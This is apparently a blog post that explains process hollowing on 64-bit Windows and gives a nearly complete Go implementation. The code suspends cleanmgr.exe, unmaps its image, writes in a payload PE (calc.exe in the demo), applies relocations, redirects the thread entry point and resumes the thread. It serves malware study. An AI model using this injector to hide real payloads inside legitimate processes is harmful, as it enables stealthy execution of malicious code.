---
title: Process Hollowing
permalink: posts/ProcessHollowing
permalink_name: ProcessHollowing
---

Process hollowing was by far the hardest technique to implement. The added challenge of using Go showed here, as many of the structs needed were not implemented or even documented.

The idea behind process hollowing, in short, is:

- start the suspended process,
- unmap the process memory that contains the executable that was loaded originally,
- copy payload PE in the unmapped memory,
- restart the process, which will now execute our payload.

My implementation works, however, it is worth noticing that not every PE can be chosen as target or payload process. In my case I am using `C:\Windows\system32\cleanmgr.exe` as target, and `C:\Windows\system32\calc.exe` as payload. No guarantees other PEs will work the same.

A few notes before getting into the implementation regarding things I won't show, but you can check [the implementation](https://github.com/giacomo270197/Malware_Techniques_Implementations/tree/main/src/injectors/process_hollowing) for:

- not many functions I needed were already defined for me, so I had to load them manually,
- many structs are not implemented either, my implementation is in a separate `structs.go` file you can check on Github,
- the implementation follows the same path/idea as [this post](https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations), with a lot of contributions from other Stackoverflow posts, blogs, and Github repos I needed to implement the thing in Go and change it from 32 to 64 bits.

### Start suspended process

As already mentioned, the first thing we need to do is to start a process in a suspended state which we will hollow later on.
This is rather simple, as we just have to call `CreateProcess` with and pass `CREATE_SUSPENDED` (4) AS `dwCreationFlags`.
We create a couple of structs to give as `lpStartupInfo` and `lpProcessInformation` and we have our process like so

```go
// Start the target process in a suspended state
var startupInfo windows.StartupInfo
var processInfo windows.ProcessInformation
fmt.Println("[+] Starting victim process")
err := windows.CreateProcess(nil, &targetProcessUTF16[0], nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, &startupInfo, &processInfo)
defer windows.CloseHandle(processInfo.Process)
if err != nil {
    fmt.Println("[-] Failed to start victim process")
}
```

### Unmap the image out of target process memory

Reading "Practical Malware Analysis" this seems like a breeze. Just call `ntUnmapViewOfSection`. Of course, in practice, this is a bit more complicated, which is also why I decided to implement these techniques.
We will, indeed, use the undocumented function `ntUnmapViewOfSection` to hollow out the target process of its loaded image, however, the function needs to be told where the image is loaded in the target process to work. This complicated things a bit, but it can be done.
The location where the image is loaded is recorded in the `PEB`, under `ImageBaseAddress`. That's nice, however, how do we retrieve the `PEB`?
We can do that by calling `NtQueryInformationProcess`, which is going to return a struct called `PROCESS_BASIC_INFORMATION` which contains the address of the `PEB` under `PebBaseAddress`.

So after reading some docs and implementing some structs we now retrieve `PROCESS_BASIC_INFORMATION`. The series of casting is used to populate my Go struct out of the memory pointed to by the pointer that `ntQueryInformationProcess` returns. I will use a lot of similar casting as I go along to populate structs I implemented myself.

```go
// Try to find victim process' PROCESS_BASIC_INFORMATION
var procBasicInfo PROCESS_BASIC_INFORMATION
var returnedLength uint32
r1, _, _ := ntQueryInformationProcess.Call(
    uintptr(processInfo.Process),
    uintptr((uint32)(0)), // ProcessBasicInformation
    uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&procBasicInfo)))), // Inspired by https://github.com/winlabs/gowin32/blob/master/process.go
    uintptr((uint32)(unsafe.Sizeof(procBasicInfo))),
    uintptr(unsafe.Pointer(&returnedLength)),
)
if r1 != 0 {
    log.Fatal("[-] Failed to retrieve victim's PROCESS_BASIC_INFORMATION")
}
fmt.Printf("[+] Retrieved PROCESS_BASIC_INFORMATION, returned %d bytes\n", returnedLength)
```

Once we have the location of `PEB`, which is located in the process memory, we can just read it out with `ReadProcessMemory`.

```go
// Trying to retrieve PEB
var peb PEB
var bytesRead uint32
r1, _, _ = readProcessMemory.Call(
    uintptr(processInfo.Process),
    procBasicInfo.PebBaseAddress,
    uintptr(unsafe.Pointer((*byte)(unsafe.Pointer(&peb)))),
    uintptr((uint32)(unsafe.Sizeof(peb))),
    uintptr(unsafe.Pointer(&bytesRead)),
)
if r1 == 0 {
    log.Fatal("[-] Failed to retrieve victim's PEB")
}
fmt.Printf("[+] Retrieved PEB and BaseImageAddress, read %d bytes\n", bytesRead)
fmt.Printf("[+] Retrieved ImageBaseAddress at %p\n", unsafe.Pointer(peb.ImageBaseAddress))
```

And we got out image location. Now we can do the last step and unmap the memory region containing the image so that we will be able to load our target image later on. We start unmapping from `ImageBaseAddress`.

```go
// Trying to hollow target process
r1, _, _ = ntUnmapViewOfSection.Call(
    uintptr(processInfo.Process),
    peb.ImageBaseAddress,
)
if r1 != 0 {
    log.Fatal("[-] Failed to unmap target process image memory location")
}
fmt.Println("[+] Successfully unmapped target process memory")
```

### Copy payload PE into target process memory

Copying the payload PE was by far the hardest bit of the implementation. The main issue is making sure that all offsets match again once the PE is copied in.

First things first, we need to read the payload PE. The post I followed copied the entire PE into the heap and worked on that, and so did I. I think there are probably other ways of doing this bit.

```go
// Trying to write the payload executable to memory
file, err := windows.CreateFile(&injectedProcessUTF16[0], windows.GENERIC_READ, 0, nil, windows.OPEN_ALWAYS, 0, 0)
defer windows.CloseHandle(file)
if err != nil {
    fmt.Println("[-] Failed to open file")
    log.Fatal(err)
}
fileSizeUintptr, _, _ := getFileSize.Call(uintptr(file), uintptr(unsafe.Pointer(nil)))
fileSize := (uint32)(fileSizeUintptr)
fmt.Printf("[+] Read file %s, total of %d bytes\n", injectedProcess, fileSize)
heap, _, _ := getProcessHeap.Call()
heapHandle := (windows.Handle)(heap)
defer windows.CloseHandle(heapHandle)
if heap == 0 {
    log.Fatal("[-] Failed to get process heap")
}
// dwFlags = 0x00000008 should be HEAP_ZERO_MEMORY
heapStartPtr, _, _ := heapAlloc.Call(heap, uintptr((uint32)(8)), uintptr((uint32)(fileSize)))
if heapStartPtr == 0 {
    log.Fatal("[-] Failed allocate space on the heap")
}
bytesRead = 0
r1, _, _ = readFile.Call(
    uintptr(file),
    heapStartPtr, // This I could have not done with the funtion defined in the windows package
    uintptr((uint32)(fileSize)),
    uintptr((uint32)(bytesRead)),
    uintptr(unsafe.Pointer(nil)),
)
// Would expected to check that readBytes matches fileSize here, but apparently readBytes returns 0 if reading to
// EOF (which we are doing) as descibed here https://devblogs.microsoft.com/oldnewthing/20150121-00/?p=44863
if r1 == 0 {
    log.Fatal("[-] Failed to write payload to the heap")
}
fmt.Println("[+] Successfully written payload to heap")
```

Next, we will need some information regarding the size and offset of several components of the PE. We, therefore, need to be able to read through the headers. We first read the DOS headers, mainly because they contain the offset of the location of the NT headers recorded under `E_lfanew`.
With a pointer to the NT headers, we can then do the necessary casting to populate our structs.

```go
dosHeaders := (*IMAGE_DOS_HEADERS)(unsafe.Pointer(heapStartPtr))
ntHeadersStartPrt := heapStartPtr + uintptr(dosHeaders.E_lfanew)
ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(ntHeadersStartPrt))
```

Now that we have access to the NT headers, we can retrieve the size of the image, located in the optional headers. We are going to need this to know how much space to allocate on the remote process to fit our new image in. We allocate memory starting from the unmapped region at `ImageBaseAddress`. Note that we will not need any special permission to write to remote memory since we already own the process.

```go
// Trying to allocate enough memory on victim process to fit our payload in
r1, _, _ = virtualAllocEx.Call(
    uintptr(processInfo.Process),
    uintptr(peb.ImageBaseAddress),
    uintptr(ntHeaders.OptionalHeader.SizeOfImage),
    uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
    uintptr(windows.PAGE_EXECUTE_READWRITE),
)
if r1 == 0 {
    log.Fatal("[-] Failed to allocate memory on the victim process")
}

fmt.Println("[+] Successfully allocated memory on victim process")
```

Now that we have the space we need on the remote process, we can start copying the image. This was really the hard part of the implementation.
First of all, we can go ahead and copy the image headers. We do need to change something, the `ImageBase` field on the PE is the location where the image would like to be loaded. This will most likely be something different (much lower) than the `ImageBaseAddress` of the remote process, which is where the image is actually going to be loaded into. Before changing the header value, we need to record the difference between the locations of the `ImageBase` and `ImageBaseAddress` values, as we will need them later for relocation.

```go
// Trying to write payload to target process
// Starting with the headers
var bytesWritten uint32
// Get image base delta for later relocation
deltaImageBase := peb.ImageBaseAddress - uintptr(ntHeaders.OptionalHeader.ImageBase)
ntHeaders.OptionalHeader.ImageBase = uint64(peb.ImageBaseAddress)
r1, _, _ = writeProcessMemory.Call(
    uintptr(processInfo.Process),
    peb.ImageBaseAddress,
    heapStartPtr,
    uintptr(ntHeaders.OptionalHeader.SizeOfHeaders),
    uintptr(unsafe.Pointer(&bytesWritten)),
)
if r1 == 0 || bytesWritten != ntHeaders.OptionalHeader.SizeOfHeaders {
    log.Fatal("[-] Failed to copy headers to remote process")
}
fmt.Println("[+] Copied headers to target process")
```

Right after the headers, we can start copying the sections. We first locate the section headers right after the NT headers. Each section header has three important values to look out for right now.
`VirtualAddress` represents where the section will be located in memory. It is expressed as an offset with respect to the `ImageBaseAddress` of the process image. This is where we want to copy our image.
`PointerToRawData` represents where the sections are located on disk in the PE file. It is represented as an offset to the begging of the file, in our case the beginning of the heap region the file was copied to.
`SizeOfRawData` represents the size of the section. Together with `PointerToRawData` we will use it to retrieve the section we want to copy from the PE file.

Finally, there is one section we need to look out for. The `.reloc` section is important for us and we want to keep a pointer to it because we will need it later. We hardcoded the ".reloc" name and checked if the section we were analyzing was the relocation section. If yes, we stored a pointer to it.
That said, here is the code that copies the image sections over the right memory location.

```go
// First of all, we need to find the pointer to the first section header which should be right after the Optional Headers
sectionHeaderPtr := uintptr(unsafe.Pointer(heapStartPtr + uintptr(dosHeaders.E_lfanew) + unsafe.Sizeof(*ntHeaders)))
relocName := [8]byte{46, 114, 101, 108, 111, 99, 0, 0}
var relocationSection *IMAGE_SECTION_HEADER
var i uint16
for i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++ {
    sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionHeaderPtr))
    // Check if we hit the .reloc section yet
    if sectionHeader.Name == relocName {
        relocationSection = sectionHeader
    }
    // We now need to get memory destination of the target process where the section should be copied to
    destSectionLocation := peb.ImageBaseAddress + uintptr(sectionHeader.VirtualAddress)
    // Now we need to get the location of the section in the file, aka in the current process heap
    srcSectionLocation := heapStartPtr + uintptr(sectionHeader.PointerToRawData)
    // Actually write to remote memory and advance section header pointer
    bytesWritten = 0
    r1, _, _ = writeProcessMemory.Call(
        uintptr(processInfo.Process),
        destSectionLocation,
        srcSectionLocation,
        uintptr(sectionHeader.SizeOfRawData),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )
    if r1 == 0 || bytesWritten != sectionHeader.SizeOfRawData {
        log.Fatal("[-] Failed to copy a section to remote memory")
    }
    sectionHeaderPtr += unsafe.Sizeof(*sectionHeader)
}
fmt.Println("[+] Succefully copied PE section to target process")
```

When an image is loaded into a process, its `ImageBase` usually will not be the address it actually ends up being loaded into. Because of this, some elements will need patching, if they are not represented as relative addresses. The Windows loader knows what to patch by going through the relocation table of a PE and applying the difference in image loading address to the values that need patching.
Since we are now loading an image into a process manually, we cannot rely on Windows to do the patching for us.
Very briefly, the relocation table is made of blocks. Each block has an 8-byte header, where the first 4 bytes represent the block location in memory (as an offset to `ImageBaseAddress`) and the last 4 bytes represent the size of the block in bytes. After the header, 2-bytes relocation entries represent the relocation type (4 bits) and the actual memory location that needs patching (12 bits), again as an offset to `ImageBaseAddress`.
The basic idea behind doing relocation, then, is to iterate through the blocks, starting from the relocation section pointer we saved earlier, and for every relocation entry, the location pointed to has to be patched by adding the difference between the old and new `ImageBase`.
If it is present, the Optional headers might contain `RelocationDirectoryRVA` and `RelocationDirectorySize` which can also be used to get the relocation table location and size.

```go
var relocationTableDataDir IMAGE_DATA_DIRECTORY
relocationTableDataDir.VirtualAddress = ntHeaders.OptionalHeader.RelocationDirectoryRVA
relocationTableDataDir.Size = ntHeaders.OptionalHeader.RelocationDirectorySize

var relocationOffset uint32 = 0
var relocationTable = relocationSection.PointerToRawData

for relocationOffset < relocationTableDataDir.Size {
    relocationBlockPtr := heapStartPtr + uintptr(relocationTable) + uintptr(relocationOffset)
    relocationBlock := (*BASE_RELOCATION_BLOCK)(unsafe.Pointer(relocationBlockPtr))
    relocationOffset += uint32(unsafe.Sizeof(*relocationBlock))
    numberRelocationEntries := (relocationBlock.BlockSize - uint32(8)) / uint32(2)
    for i := 0; i < int(numberRelocationEntries); i++ {
        relocationEntryPtr := heapStartPtr + uintptr(relocationTable) + uintptr(relocationOffset)
        relocationEntry := GetBaseRelocationEntry(*(*uint16)(unsafe.Pointer(relocationEntryPtr)))
        if relocationEntry.Type != 0 {
            var bytesRead uint32 = 0
            var bytesWritten uint32 = 0
            patchAddress := uintptr(relocationBlock.PageRVA) + uintptr(relocationEntry.Offset)
            patchedBuffer := uint64(0)
            r1, _, _ := readProcessMemory.Call(
                uintptr(processInfo.Process),
                peb.ImageBaseAddress+patchAddress,
                uintptr(unsafe.Pointer(&patchedBuffer)),
                uintptr(8), // sizeof uint64
                uintptr(unsafe.Pointer(&bytesRead)),
            )
            if r1 == 0 || bytesRead != 8 {
                log.Fatal("[-] Failed to retrieve relocation entry")
            }
            patchedBuffer += uint64(deltaImageBase)
            r1, _, _ = writeProcessMemory.Call(
                uintptr(processInfo.Process),
                peb.ImageBaseAddress+patchAddress,
                uintptr(unsafe.Pointer(&patchedBuffer)),
                uintptr(8),
                uintptr(unsafe.Pointer(&bytesWritten)),
            )
            if r1 == 0 || bytesWritten != 8 {
                log.Fatal("[-] Failed to write relocation entry to memory")
            }
        }
        relocationOffset += 2
    }

}
```

With the relocation done, we now have successfully copied our image into the remote process, which we can now restart.

### Restarting the process

Restarting a thread would usually be as simple as calling `ResumeThread`, however, in our case, we must do one more thing.
Execution of a PE file usually starts from an address defined in `AddressOfEntryPoint` in the optional headers. When a thread is suspended, the address is stored in the thread context, to be restored into the `Rcx` register (`Eax` for 32-bits machines).
Therefore, the current process one and only thread has, at the moment, a context that would load the value of the old PEs `AddressOfEntryPoint` starting execution from a random point. We need to change that by updating the thread context with the `AddressOfEntryPoint` of our payload. We can do that by using `GetThreadContext` and `SetThreadContext`.

```go
var context CONTEXT
context.ContextFlags = (0x00100000 | 0x00000002) // CONTEXT_INTEGER
r1, _, _ = getThreadContext.Call(
    uintptr(processInfo.Thread),
    uintptr(unsafe.Pointer(&context)),
)
if r1 == 0 {
    log.Fatal("[-] Failed to retrieve target process thread context")
}
fmt.Println("[+] Retrieved thread context")

newEntryPoint := peb.ImageBaseAddress + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)
context.Rcx = uint64(newEntryPoint)
r1, _, _ = setThreadContext.Call(
    uintptr(processInfo.Thread),
    uintptr(unsafe.Pointer(&context)),
)
if r1 == 0 {
    log.Fatal("[-] Failed to set remote process thread context")
}
```

And now we are finally ready to restart our thread, which will now execute our payload.

```go
res, err := windows.ResumeThread(processInfo.Thread)
if res != 1 || err != nil {
    log.Fatal("[-] Failed to resume remote process thread")
}
fmt.Println("[+] Successfully resumed remote thread")
```

While this actually starts `calc.exe`, process explorer does show Calculator running as a process, which of course defeats the purpose of process hollowing. However I believe this is not due to a mistake in my implementation, so I will do some tests later on to check how other executables behave.